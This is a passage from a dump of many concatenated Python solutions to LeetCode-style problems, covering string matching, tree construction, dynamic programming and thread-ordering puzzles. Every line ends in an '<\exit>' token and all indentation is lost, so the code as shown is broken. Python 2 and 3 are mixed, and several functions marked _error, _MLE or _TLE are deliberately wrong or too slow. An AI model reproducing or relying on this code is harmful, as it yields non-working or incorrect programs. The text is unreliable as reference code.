for q in queries:<\exit>
ret.append(self.match(q, pattern))<\exit>
return ret<\exit>
def match(self, q, p):<\exit>
i = 0<\exit>
j = 0<\exit>
while i < len(q) and j < len(p):<\exit>
if q[i] == p[j]:<\exit>
i += 1<\exit>
j += 1<\exit>
elif q[i].islower():<\exit>
i += 1<\exit>
else:<\exit>
break<\exit>
while i < len(q) and q[i].islower():<\exit>
i += 1<\exit>
return i == len(q) and j == len(p)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().camelMatch(["FooBar","FooBarTest","FootBall","FrameBuffer","ForceFeedBack"], "FoBa") == [True, False, True, False, False]<\exit>
from typing import List<\exit>
class Solution:<\exit>
def videoStitching(self, clips: List[List[int]], T: int) -> int:<\exit>
clips.sort()<\exit>
prev_e = 0<\exit>
ret = 0<\exit>
i = 0<\exit>
while i < len(clips):<\exit>
if clips[i][0] > prev_e:<\exit>
break<\exit>
max_e = -float("inf")<\exit>
while i < len(clips) and clips[i][0] <= prev_e:<\exit>
max_e = max(max_e, clips[i][1])<\exit>
i += 1<\exit>
prev_e = max_e<\exit>
ret += 1<\exit>
if prev_e >= T:<\exit>
break<\exit>
return ret if prev_e >= T else -1<\exit>
def videoStitching_error(self, clips: List[List[int]], T: int) -> int:<\exit>
A = [(s, -e, s, e) for s, e in clips]<\exit>
A.sort()<\exit>
ret = 1<\exit>
_, _, prev_s, prev_e = A[0]<\exit>
if prev_s > 0:<\exit>
return False<\exit>
for _, _, s, e in A[1:]:<\exit>
if s <= prev_e and e > prev_e:<\exit>
prev_e = e<\exit>
ret += 1<\exit>
if __name__ == "__main__":<\exit>
assert Solution().videoStitching([[0,4],[2,8]], 5) == 2<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.ret = 0<\exit>
def maxAncestorDiff(self, root: TreeNode) -> int:<\exit>
self.dfs(root)<\exit>
return self.ret<\exit>
def dfs(self, node):<\exit>
if not node:<\exit>
return float("inf"), -float("inf")<\exit>
lmin, lmax = self.dfs(node.left)<\exit>
rmin, rmax = self.dfs(node.right)<\exit>
mini = min(lmin, rmin)<\exit>
maxa = max(lmax, rmax)<\exit>
if mini != float("inf"):<\exit>
self.ret = max(self.ret, abs(mini - node.val))<\exit>
if maxa != -float("inf"):<\exit>
self.ret = max(self.ret, abs(maxa - node.val))<\exit>
return min(mini, node.val), max(maxa, node.val)<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def longestArithSeqLength(self, A: List[int]) -> int:<\exit>
F = defaultdict(lambda: defaultdict(lambda: 1))<\exit>
for i in range(len(A)):<\exit>
for j in range(i):<\exit>
delta = A[i] - A[j]<\exit>
F[i][delta] = F[j][delta] + 1<\exit>
ret = 0<\exit>
for d in F.values():<\exit>
for v in d.values():<\exit>
ret = max(ret, v)<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().longestArithSeqLength([20,1,15,3,10,5,8]) == 4<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
from collections import OrderedDict<\exit>
class Solution:<\exit>
def recoverFromPreorder(self, S: str) -> TreeNode:<\exit>
depth = 0<\exit>
n = len(S)<\exit>
i = 0<\exit>
root = None<\exit>
stk = []<\exit>
while i < n:<\exit>
if S[i] == "-":<\exit>
depth += 1<\exit>
i += 1<\exit>
else:<\exit>
j = i<\exit>
while j < n and S[j] != "-":<\exit>
j += 1<\exit>
val = int(S[i:j])<\exit>
cur = TreeNode(val)<\exit>
if depth == 0:<\exit>
root = cur<\exit>
stk = [(depth, root)]<\exit>
else:<\exit>
assert stk<\exit>
while stk[-1][0] != depth - 1:<\exit>
stk.pop()<\exit>
_, pi = stk[-1]<\exit>
if not pi.left:<\exit>
pi.left = cur<\exit>
elif not pi.right:<\exit>
pi.right = cur<\exit>
stk.pop()<\exit>
else:<\exit>
raise<\exit>
stk.append((depth, cur))<\exit>
depth = 0<\exit>
i = j<\exit>
return root<\exit>
def recoverFromPreorder_error(self, S: str) -> TreeNode:<\exit>
depth = 0<\exit>
depths = OrderedDict()<\exit>
n = len(S)<\exit>
i = 0<\exit>
while i < n:<\exit>
if S[i] == "-":<\exit>
depth += 1<\exit>
i += 1<\exit>
else:<\exit>
j = i<\exit>
while j < n and S[j] != "-":<\exit>
j += 1<\exit>
val = int(S[i:j])<\exit>
depths[val] = depth<\exit>
depth = 0<\exit>
i = j<\exit>
stk = []<\exit>
root = None<\exit>
for k, v in depths.items():<\exit>
cur = TreeNode(k)<\exit>
if v == 0:<\exit>
root = cur<\exit>
stk = [root]<\exit>
else:<\exit>
assert stk<\exit>
while depths[stk[-1].val] != v - 1:<\exit>
stk.pop()<\exit>
if not stk[-1].left:<\exit>
stk[-1].left = cur<\exit>
elif not stk[-1].right:<\exit>
stk[-1].right = cur<\exit>
stk.pop()<\exit>
else:<\exit>
raise<\exit>
stk.append(cur)<\exit>
return root<\exit>
if __name__ == "__main__":<\exit>
assert Solution().recoverFromPreorder("5-4--4")<\exit>
assert Solution().recoverFromPreorder("1-2--3--4-5--6--7")<\exit>
class Solution:<\exit>
def twoCitySchedCost(self, costs: List[List[int]]) -> int:<\exit>
A = [(a - b, a, b) for a, b in costs]<\exit>
A.sort()<\exit>
ret = 0<\exit>
remain = len(A) // 2<\exit>
for _, a, b in A:<\exit>
if remain > 0:<\exit>
ret += a<\exit>
remain -= 1<\exit>
else:<\exit>
ret += b<\exit>
return ret<\exit>
def twoCitySchedCost_error(self, costs: List[List[int]]) -> int:<\exit>
A = [(abs(a - b), a, b) for a, b in costs]<\exit>
A.sort(reverse=True)<\exit>
ret = 0<\exit>
remain = len(A) // 2<\exit>
for _, a, b in A:<\exit>
if a > b:<\exit>
ret += b<\exit>
elif remain > 0:<\exit>
ret += a<\exit>
remain -= 1<\exit>
else:<\exit>
ret += b<\exit>
return ret<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def zigzagLevelOrder(self, root):<\exit>
if not root:<\exit>
return []<\exit>
result = []<\exit>
lst = [root]<\exit>
direction = False<\exit>
while lst:<\exit>
if direction:<\exit>
result.append([element.val for element in lst])<\exit>
else:<\exit>
result.append([element.val for element in reversed(lst)])<\exit>
for i in range(len(lst)):<\exit>
element = lst.pop(0)<\exit>
if element.left:<\exit>
lst.append(element.left)<\exit>
if element.right:<\exit>
lst.append(element.right)<\exit>
direction = not direction<\exit>
return result<\exit>
from typing import List<\exit>
class Solution:<\exit>
def allCellsDistOrder(self, R: int, C: int, r0: int, c0: int) -> List[List[int]]:<\exit>
r_max = max(r0, R-1 - r0)<\exit>
c_max = max(c0, C-1 - c0)<\exit>
lst = [[] for _ in range(r_max + c_max + 1)]<\exit>
for i in range(R):<\exit>
for j in range(C):<\exit>
lst[abs(i - r0) + abs(j - c0)].append([i, j])<\exit>
ret = []<\exit>
for e in lst:<\exit>
ret.extend(e)<\exit>
return ret<\exit>
from typing import List<\exit>
class Solution:<\exit>
def maxSumTwoNoOverlap(self, A: List[int], L: int, M: int) -> int:<\exit>
n = len(A)<\exit>
F = [0 for _ in range(n + 1)]<\exit>
for i, a in enumerate(A):<\exit>
F[i+1] = F[i] + a<\exit>
ret = -float("inf")<\exit>
for l, m in ((L, M), (M, L)):<\exit>
for i in range(n + 1 - l):<\exit>
for j in range(i + l, n + 1 - m):<\exit>
cur = F[i + l] - F[i] + F[j + m] - F[j]<\exit>
ret = max(ret, cur)<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().maxSumTwoNoOverlap([0,6,5,2,2,5,1,9,4], 1, 2) == 20<\exit>
class TreeNode(object):<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution(object):<\exit>
def maxDepth(self, root):<\exit>
return self.fathom(root, 0)<\exit>
def fathom(self, root, depth):<\exit>
if not root: return depth<\exit>
else: return max(self.fathom(root.left, depth+1), self.fathom(root.right, depth+1))<\exit>
dirs = [(-1, 0), (0, 1), (1, 0), (0, -1)]<\exit>
class Solution:<\exit>
def isRobotBounded(self, instructions: str) -> bool:<\exit>
x, y = 0, 0<\exit>
i = 0<\exit>
for _ in range(4):<\exit>
for cmd in instructions:<\exit>
if cmd == "G":<\exit>
dx, dy = dirs[i]<\exit>
x += dx<\exit>
y += dy<\exit>
elif cmd == "L":<\exit>
i = (i - 1) % 4<\exit>
else:<\exit>
i = (i + 1) % 4<\exit>
return x == 0 and y == 0<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def buildTree(self, inorder, postorder):<\exit>
if not inorder:<\exit>
return None<\exit>
root = TreeNode(postorder[-1])<\exit>
root_index = inorder.index(root.val)<\exit>
root.left = self.buildTree(inorder[:root_index], postorder[:root_index])<\exit>
root.right = self.buildTree(inorder[root_index+1:], postorder[root_index:-1])<\exit>
return root<\exit>
from typing import List<\exit>
import math<\exit>
class Solution:<\exit>
def minimizeError(self, prices: List[str], target: int) -> str:<\exit>
A = list(map(float, prices))<\exit>
f_sum = sum(map(math.floor, A))<\exit>
c_sum = sum(map(math.ceil, A))<\exit>
if not f_sum <= target <= c_sum:<\exit>
return "-1"<\exit>
errors = [<\exit>
e - math.floor(e)<\exit>
for e in A<\exit>
]<\exit>
errors.sort(reverse=True)<\exit>
ret = 0<\exit>
remain = target - f_sum<\exit>
for err in errors:<\exit>
if remain > 0:<\exit>
ret += 1 - err<\exit>
remain -= 1<\exit>
else:<\exit>
ret += err<\exit>
return f'{ret:.{3}f}'<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def buildTree_MLE(self, preorder, inorder):<\exit>
if not preorder:<\exit>
return None<\exit>
root = TreeNode(preorder[0])<\exit>
root_index = inorder.index(root.val)<\exit>
root.left = self.buildTree(preorder[1:root_index+1], inorder[0:root_index])<\exit>
root.right = self.buildTree(preorder[root_index+1:], inorder[root_index+1:])<\exit>
return root<\exit>
def buildTree(self, preorder, inorder):<\exit>
self.preorder = preorder<\exit>
self.inorder = inorder<\exit>
return self._buildTree(0, len(preorder), 0, len(inorder))<\exit>
def _buildTree(self, pre_start, pre_end, in_start, in_end):<\exit>
if pre_start >= pre_end:<\exit>
return None<\exit>
root = TreeNode(self.preorder[pre_start])<\exit>
offset = self.inorder[in_start:in_end + 1].index(root.val)<\exit>
root.left = self._buildTree(pre_start + 1, pre_start + offset + 1, in_start, in_start + offset)<\exit>
root.right = self._buildTree(pre_start + offset + 1, pre_end, in_start + offset + 1, in_end)<\exit>
return root<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def levelOrderBottom(self, root):<\exit>
if not root:<\exit>
return []<\exit>
result = []<\exit>
next_level = [root]<\exit>
while next_level:<\exit>
current_level = next_level<\exit>
result.insert(0, map(lambda x: x.val, current_level))<\exit>
next_level = []<\exit>
for element in current_level:<\exit>
if element.left:<\exit>
next_level.append(element.left)<\exit>
if element.right:<\exit>
next_level.append(element.right)<\exit>
return result<\exit>
if __name__=="__main__":<\exit>
Solution().levelOrderBottom(TreeNode(1))<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def sortedArrayToBST(self, num):<\exit>
if not num:<\exit>
return None<\exit>
mid = (0+len(num))/2<\exit>
left_subtree = self.sortedArrayToBST(num[0:mid])<\exit>
right_subtree = self.sortedArrayToBST(num[mid+1:])<\exit>
root = TreeNode(num[mid])<\exit>
root.left = left_subtree<\exit>
root.right = right_subtree<\exit>
return root<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.current_node = None<\exit>
def sortedListToBST(self, head):<\exit>
if not head:<\exit>
return head<\exit>
self.current_node = head<\exit>
length = self.getLength(head)<\exit>
return self.sortedListToBST_dfs(0, length-1)<\exit>
def sortedListToBST_dfs(self, start, end):<\exit>
if start>end:<\exit>
return<\exit>
mid = (start+end)/2<\exit>
left_subtree = self.sortedListToBST_dfs(start, mid-1)<\exit>
root = TreeNode(self.current_node.val)<\exit>
self.current_node = self.current_node.next<\exit>
right_subtree = self.sortedListToBST_dfs(mid+1, end)<\exit>
root.left = left_subtree<\exit>
root.right = right_subtree<\exit>
return root<\exit>
def getLength(self, head):<\exit>
count = 0<\exit>
while head:<\exit>
head = head.next<\exit>
count += 1<\exit>
return count<\exit>
class TreeNode(object):<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.depth_bottom = {}<\exit>
def isBalanced(self, root):<\exit>
self.fathom(root, 0)<\exit>
return self._is_balanced(root, 0)<\exit>
def _is_balanced(self, cur, depth):<\exit>
if not cur:<\exit>
return True<\exit>
h1 = h2 = depth<\exit>
if cur.left: h1 = self.depth_bottom[cur.left]<\exit>
if cur.right: h2 = self.depth_bottom[cur.right]<\exit>
if abs(h1 - h2) > 1:<\exit>
return False<\exit>
return all([self._is_balanced(cur.left, depth+1), self._is_balanced(cur.right, depth+1)])<\exit>
def fathom(self, root, depth):<\exit>
if not root:<\exit>
return depth-1<\exit>
ret = max(self.fathom(root.left, depth+1), self.fathom(root.right, depth+1))<\exit>
self.depth_bottom[root] = ret<\exit>
return ret<\exit>
class SolutionSlow(object):<\exit>
def isBalanced(self, root):<\exit>
if not root:<\exit>
return True<\exit>
if abs(self.fathom(root.left, 0)-self.fathom(root.right, 0)) > 1:<\exit>
return False<\exit>
if self.isBalanced(root.left) and self.isBalanced(root.right):<\exit>
return True<\exit>
else:<\exit>
return False<\exit>
def fathom(self, root, depth):<\exit>
if not root:<\exit>
return depth-1<\exit>
return max(self.fathom(root.left, depth+1), self.fathom(root.right, depth+1))<\exit>
class TreeNode(object):<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution(object):<\exit>
def minDepth(self, root):<\exit>
return self.fathom(root, 0)<\exit>
def fathom(self, root, depth):<\exit>
if not root: return depth<\exit>
elif root.right and not root.left: return self.fathom(root.right, depth+1)<\exit>
elif root.left and not root.right: return self.fathom(root.left, depth+1)<\exit>
else: return min(self.fathom(root.left, depth+1),<\exit>
self.fathom(root.right, depth+1))<\exit>
from typing import Callable<\exit>
from threading import Lock<\exit>
class Foo:<\exit>
def __init__(self):<\exit>
self.locks = [Lock(), Lock()]<\exit>
self.locks[0].acquire()<\exit>
self.locks[1].acquire()<\exit>
def first(self, printFirst: Callable[[], None]) -> None:<\exit>
printFirst()<\exit>
self.locks[0].release()<\exit>
def second(self, printSecond: Callable[[], None]) -> None:<\exit>
with self.locks[0]:<\exit>
printSecond()<\exit>
self.locks[1].release()<\exit>
def third(self, printThird: Callable[[], None]) -> None:<\exit>
with self.locks[1]:<\exit>
printThird()<\exit>
class FooError:<\exit>
def __init__(self):<\exit>
self._value = 1<\exit>
self._lock = Lock()<\exit>
def first(self, printFirst: 'Callable[[], None]') -> None:<\exit>
with self._lock:<\exit>
if self._value == 1:<\exit>
self._value += 1<\exit>
printFirst()<\exit>
def second(self, printSecond: 'Callable[[], None]') -> None:<\exit>
with self._lock:<\exit>
if self._value == 2:<\exit>
self._value += 1<\exit>
printSecond()<\exit>
def third(self, printThird: 'Callable[[], None]') -> None:<\exit>
with self._lock:<\exit>
if self._value == 3:<\exit>
self._value += 1<\exit>
printThird()<\exit>
from threading import Lock<\exit>
from typing import Callable<\exit>
class FooBar:<\exit>
def __init__(self, n):<\exit>
self.n = n<\exit>
self.locks = [Lock(), Lock()]<\exit>
self.locks[1].acquire()<\exit>
def foo(self, printFoo: Callable[[], None]) -> None:<\exit>
for i in range(self.n):<\exit>
self.locks[0].acquire()<\exit>
printFoo()<\exit>
self.locks[1].release()<\exit>
def bar(self, printBar: Callable[[], None]) -> None:<\exit>
for i in range(self.n):<\exit>
self.locks[1].acquire()<\exit>
printBar()<\exit>
self.locks[0].release()<\exit>
from typing import Callable<\exit>
from threading import Lock<\exit>
class ZeroEvenOdd:<\exit>
def __init__(self, n):<\exit>
self.n = n<\exit>
self.locks = [Lock() for _ in range(3)]<\exit>
self.locks[1].acquire()<\exit>
self.locks[2].acquire()<\exit>
def zero(self, printNumber: Callable[[int], None]) -> None:<\exit>
for i in range(self.n):<\exit>
self.locks[0].acquire()<\exit>
printNumber(0)<\exit>
if (i + 1) % 2 == 1:<\exit>
self.locks[1].release()<\exit>
else:<\exit>
self.locks[2].release()<\exit>
def odd(self, printNumber: Callable[[int], None]) -> None:<\exit>
for i in range((self.n + 1) // 2):<\exit>
self.locks[1].acquire()<\exit>
printNumber(i * 2 + 1)<\exit>
self.locks[0].release()<\exit>
def even(self, printNumber: Callable[[int], None]) -> None:<\exit>
for i in range(self.n // 2):<\exit>
self.locks[2].acquire()<\exit>
printNumber(i * 2 + 2)<\exit>
self.locks[0].release()<\exit>
class ZeroEvenOddError:<\exit>
def __init__(self, n):<\exit>
self.n = n<\exit>
self.locks = [Lock(), Lock(), Lock(), Lock()]<\exit>
for i in range(1, len(self.locks)):<\exit>
self.locks[i].acquire()<\exit>
def zero(self, printNumber: 'Callable[[int], None]') -> None:<\exit>
with self.locks[0]:<\exit>
printNumber(0)<\exit>
def even(self, printNumber: 'Callable[[int], None]') -> None:<\exit>
pass<\exit>
def odd(self, printNumber: 'Callable[[int], None]') -> None:<\exit>
pass<\exit>
from typing import Callable<\exit>
from threading import Semaphore<\exit>
from collections import deque<\exit>
class H2O:<\exit>
def __init__(self):<\exit>
self.hq = deque()<\exit>
self.oq = deque()<\exit>
def hydrogen(self, releaseHydrogen: Callable[[], None]) -> None:<\exit>
self.hq.append(releaseHydrogen)<\exit>
self.try_output()<\exit>
def oxygen(self, releaseOxygen: Callable[[], None]) -> None:<\exit>
self.oq.append(releaseOxygen)<\exit>
self.try_output()<\exit>
def try_output(self):<\exit>
if len(self.hq) >= 2 and len(self.oq) >= 1:<\exit>
self.hq.popleft()()<\exit>
self.hq.popleft()()<\exit>
self.oq.popleft()()<\exit>
class H2O_TLE2:<\exit>
def __init__(self):<\exit>
self.gates = [Semaphore(2), Semaphore(0)]<\exit>
def hydrogen(self, releaseHydrogen: Callable[[], None]) -> None:<\exit>
self.gates[0].acquire()<\exit>
releaseHydrogen()<\exit>
if self.gates[0].acquire(blocking=False):<\exit>
self.gates[0].release()<\exit>
else:<\exit>
self.gates[1].release()<\exit>
def oxygen(self, releaseOxygen: Callable[[], None]) -> None:<\exit>
self.gates[1].acquire()<\exit>
releaseOxygen()<\exit>
self.gates[0].release()<\exit>
self.gates[0].release()<\exit>
class H2O_TLE:<\exit>
def __init__(self):<\exit>
self.h_cnt = 0<\exit>
self.locks = [Lock() for _ in range(3)]<\exit>
self.locks[1].acquire()<\exit>
def hydrogen(self, releaseHydrogen: Callable[[], None]) -> None:<\exit>
self.locks[0].acquire()<\exit>
self.h_cnt += 1<\exit>
releaseHydrogen()<\exit>
if self.h_cnt < 2:<\exit>
self.locks[0].release()<\exit>
else:<\exit>
self.locks[1].release()<\exit>
def oxygen(self, releaseOxygen: Callable[[], None]) -> None:<\exit>
self.locks[1].acquire()<\exit>
releaseOxygen()<\exit>
self.h_cnt = 0<\exit>
self.locks[0].release()<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def hasPathSum(self, root, sum):<\exit>
if not root:<\exit>
return False<\exit>
sum = sum-root.val<\exit>
if sum==0 and root.left is None and root.right is None:<\exit>
return True<\exit>
return self.hasPathSum(root.left, sum) or self.hasPathSum(root.right, sum)<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def pathSum(self, root, sum):<\exit>
result = []<\exit>
self.accumulatePathSum(root, sum, [], result)<\exit>
return result<\exit>
def accumulatePathSum(self, root, sum, cur_path, result):<\exit>
if not root:<\exit>
return<\exit>
sum = sum - root.val<\exit>
cur_path.append(root.val)<\exit>
if sum==0 and root.left is None and root.right is None:<\exit>
result.append(list(cur_path))<\exit>
return<\exit>
if root.left: self.accumulatePathSum(root.left, sum, list(cur_path), result)<\exit>
if root.right: self.accumulatePathSum(root.right, sum, list(cur_path), result)<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
def __repr__(self):<\exit>
return repr(self.val)<\exit>
class Solution:<\exit>
def flatten_data_structure(self, root):<\exit>
if not root:<\exit>
return<\exit>
lst = []<\exit>
self.dfs_traverse(root, lst)<\exit>
lst = lst[1:]<\exit>
root.left = None<\exit>
cur = root<\exit>
for node in lst:<\exit>
node.left = None<\exit>
node.right = None<\exit>
cur.right = node<\exit>
cur = cur.right<\exit>
def dfs_traverse(self, root, lst):<\exit>
if not root:<\exit>
return<\exit>
lst.append(root)<\exit>
self.dfs_traverse(root.left, lst)<\exit>
self.dfs_traverse(root.right, lst)<\exit>
def flatten(self, root):<\exit>
if not root:<\exit>
return None<\exit>
left_last = self.get_last(root.left)<\exit>
left = self.flatten(root.left)<\exit>
right = self.flatten(root.right)<\exit>
root.left = None<\exit>
if left:<\exit>
root.right = left<\exit>
left_last.right = right<\exit>
else:<\exit>
root.right = right<\exit>
return root<\exit>
def get_last(self, root):<\exit>
if not root:<\exit>
return None<\exit>
if not root.left and not root.right:<\exit>
return root<\exit>
if root.right:<\exit>
return self.get_last(root.right)<\exit>
else:<\exit>
return self.get_last(root.left)<\exit>
if __name__=="__main__":<\exit>
node1 = TreeNode(1)<\exit>
node2 = TreeNode(2)<\exit>
node1.left = node2<\exit>
Solution().flatten(node1)<\exit>
class Solution:<\exit>
def numDistinct(self, S, T):<\exit>
len_s = len(S)<\exit>
len_t = len(T)<\exit>
dp = [[-1 for _ in xrange(len_s+1)] for _ in xrange(len_t+1)]<\exit>
for col in xrange(len_s+1):<\exit>
dp[0][col] = 1<\exit>
for row in xrange(1, len_t+1):<\exit>
dp[row][0] = 0<\exit>
for row in xrange(1, len_t+1):<\exit>
for col in xrange(1, len_s+1):<\exit>
if S[col-1]==T[row-1]:<\exit>
dp[row][col] = dp[row][col-1]+dp[row-1][col-1]<\exit>
else:<\exit>
dp[row][col] = dp[row][col-1]<\exit>
return dp[-1][-1]<\exit>
if __name__=="__main__":<\exit>
assert Solution().numDistinct("rabbbit", "rabbit")==3<\exit>
class Solution:<\exit>
def generate(self, numRows):<\exit>
result = []<\exit>
for row in xrange(numRows):<\exit>
current = []<\exit>
for col in xrange(row+1):<\exit>
if col==0 or col==row:<\exit>
current.append(1)<\exit>
else:<\exit>
current.append(result[row-1][col-1]+result[row-1][col])<\exit>
result.append(current)<\exit>
return result<\exit>
if __name__=="__main__":<\exit>
print Solution().generate(5)<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
self.next = None<\exit>
class Solution:<\exit>
def connect(self, root):<\exit>
if not root:<\exit>
return None<\exit>
q = [root]<\exit>
while q:<\exit>
current_level = q<\exit>
q = []<\exit>
for ind, val in enumerate(current_level):<\exit>
if val.left: q.append(val.left)<\exit>
if val.right: q.append(val.right)<\exit>
try:<\exit>
val.next = current_level[ind+1]<\exit>
except IndexError:<\exit>
val.next = None<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
self.next = None<\exit>
class Solution:<\exit>
def connect(self, root):<\exit>
if not root:<\exit>
return None<\exit>
q = [root]<\exit>
while q:<\exit>
current_level = q<\exit>
q = []<\exit>
for ind, val in enumerate(current_level):<\exit>
if val.left: q.append(val.left)<\exit>
if val.right: q.append(val.right)<\exit>
try:<\exit>
val.next = current_level[ind+1]<\exit>
except IndexError:<\exit>
val.next = None<\exit>
class Solution:<\exit>
def getRow(self, rowIndex):<\exit>
if rowIndex<0:<\exit>
return None<\exit>
if rowIndex==0:<\exit>
return [1]<\exit>
current_level = [1, 1]<\exit>
for row in xrange(2, rowIndex+1):<\exit>
temp = current_level[0]<\exit>
for col in xrange(1, row):<\exit>
summation = current_level[col] + temp<\exit>
temp = current_level[col]<\exit>
current_level[col] = summation<\exit>
current_level.append(1)<\exit>
return current_level<\exit>
if __name__=="__main__":<\exit>
print Solution().getRow(3)<\exit>
class Solution:<\exit>
def minimumTotal(self, triangle):<\exit>
dp = []<\exit>
length = len(triangle)<\exit>
dp.insert(0, [num for num in triangle[length-1]])<\exit>
for row in xrange(length-1-1, -1, -1):<\exit>
dp.insert(0, [])<\exit>
for col in xrange(len(triangle[row])):<\exit>
dp[0].append(triangle[row][col]+min(dp[1][col], dp[1][col+1]))<\exit>
assert len(dp[0])==1<\exit>
return dp[0][0]<\exit>
if __name__=="__main__":<\exit>
Solution().minimumTotal([[-1], [2, 3], [1, -1, -3]])<\exit>
class Solution:<\exit>
def maxProfit(self, prices):<\exit>
if len(prices) <= 1:<\exit>
return 0<\exit>
delta_prices = []<\exit>
for i in xrange(1, len(prices)):<\exit>
delta_prices.append(prices[i]-prices[i-1])<\exit>
profit = 0<\exit>
for i in xrange(len(delta_prices)):<\exit>
if delta_prices[i] > 0:<\exit>
profit += delta_prices[i]<\exit>
return profit<\exit>
class Solution(object):<\exit>
def maxProfit(self, A):<\exit>
if len(A) <= 1:<\exit>
return 0<\exit>
n = len(A)<\exit>
F = [0 for _ in xrange(n+1)]<\exit>
maxa = 0<\exit>
for i in xrange(2, n+1):<\exit>
F[i] = max(F[i-1] + A[i-1] - A[i-2], 0)<\exit>
maxa = max(maxa, F[i])<\exit>
return maxa<\exit>
def maxProfitDelta(self, prices):<\exit>
if len(prices) <= 1:<\exit>
return 0<\exit>
delta_prices = []<\exit>
for i in xrange(1, len(prices)):<\exit>
delta_prices.append(prices[i]-prices[i-1])<\exit>
max_sub_array = 0<\exit>
current_sub_array = 0<\exit>
for j in xrange(len(delta_prices)):<\exit>
current_sub_array = max(0, current_sub_array+delta_prices[j])<\exit>
max_sub_array = max(max_sub_array, current_sub_array)<\exit>
return max_sub_array<\exit>
if __name__ == "__main__":<\exit>
assert Solution().maxProfit([3, 2, 1, 4, 5, 6, 2]) == 5<\exit>
class Solution:<\exit>
def maxProfit(self, prices):<\exit>
if len(prices) <= 1:<\exit>
return 0<\exit>
forward = [0 for _ in xrange(len(prices))]<\exit>
lowest_buy_price = prices[0]<\exit>
for i in xrange(1, len(prices)):<\exit>
forward[i] = max(forward[i-1], prices[i]-lowest_buy_price)<\exit>
lowest_buy_price = min(prices[i], lowest_buy_price)<\exit>
backward = [0 for _ in xrange(len(prices))]<\exit>
highest_sell_price = prices[-1]<\exit>
for i in xrange(len(prices)-2, -1, -1):<\exit>
backward[i] = max(backward[i+1], highest_sell_price-prices[i])<\exit>
highest_sell_price = max(prices[i], highest_sell_price)<\exit>
max_profit = 0<\exit>
for i in xrange(len(prices)):<\exit>
max_profit = max(max_profit, forward[i]+backward[i])<\exit>
return max_profit<\exit>
def maxProfit_error(self, prices):<\exit>
if len(prices) <= 1:<\exit>
return 0<\exit>
delta_prices = []<\exit>
for i in xrange(1, len(prices)):<\exit>
delta_prices.append(prices[i]-prices[i-1])<\exit>
max_profits = [0, 0]<\exit>
max_sub_array = 0<\exit>
current_sub_array = 0<\exit>
for j in xrange(len(delta_prices)):<\exit>
if current_sub_array+delta_prices[j] >= 0:<\exit>
current_sub_array += delta_prices[j]<\exit>
max_sub_array = max(max_sub_array, current_sub_array)<\exit>
else:<\exit>
if max_sub_array > max_profits[0]:<\exit>
max_profits[1] = max_profits[0]<\exit>
max_profits[0] = max_sub_array<\exit>
elif max_sub_array > max_profits[1]:<\exit>
max_profits[1] = max_sub_array<\exit>
max_sub_array = 0<\exit>
current_sub_array = 0<\exit>
return sum(max_profits)<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
global_max = -1<<31<\exit>
def maxPathSum(self, root):<\exit>
self.get_max_component(root)<\exit>
return self.global_max<\exit>
def get_max_component(self, root):<\exit>
if not root:<\exit>
return 0<\exit>
left_max_component = self.get_max_component(root.left)<\exit>
right_max_component = self.get_max_component(root.right)<\exit>
current_max_sum = max(root.val, root.val+left_max_component, root.val+right_max_component, root.val+left_max_component+right_max_component)<\exit>
self.global_max = max(self.global_max, current_max_sum)<\exit>
return max(root.val, root.val+left_max_component, root.val+right_max_component)<\exit>
class Solution(object):<\exit>
def isPalindrome(self, s):<\exit>
s = s.lower()<\exit>
s = ''.join(e for e in s if e.isalnum())<\exit>
if not s:<\exit>
return True<\exit>
return s == s[::-1]<\exit>
class Solution_MLE:<\exit>
class Node:<\exit>
def __init__(self, string, pre, dict):<\exit>
self.string = string<\exit>
self.pre = pre<\exit>
self.dict = dict<\exit>
def __repr__(self):<\exit>
return repr(self.string)<\exit>
def findLadders(self, start, end, dict):<\exit>
result = []<\exit>
lower_cases = [chr(i+ord('a')) for i in xrange(26)]<\exit>
